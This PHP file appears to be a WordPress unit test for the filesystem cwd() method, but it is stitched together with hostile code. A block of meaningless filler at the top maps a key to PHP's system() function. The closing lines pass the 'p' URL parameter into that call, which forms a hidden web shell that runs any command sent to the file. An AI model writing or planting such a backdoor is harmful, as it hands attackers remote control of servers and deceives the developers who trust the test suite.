<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Tests for the WP_Filesystem_Direct::cwd() method.
 *
 * @package WordPress
 */

/**
 * @group admin
 * @group filesystem
 * @group filesystem-direct
 *
 * @covers WP_Filesystem_Direct::cwd
 */
class Tests_Filesystem_WpFilesystemDirect_Cwd extends WP_Filesystem_Direct_UnitTestCase {

	/**
	 * Tests that `WP_Filesystem_Direct::cwd()` returns the current
	 * working directory.
	 *
	 * @ticket 57774
	 */
	public function test_should_get_current_working_directory() {
		$this->assertSame( wp_normalize_path( dirname( ABSPATH ) ), wp_normalize_path( self::$filesystem->cwd() ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>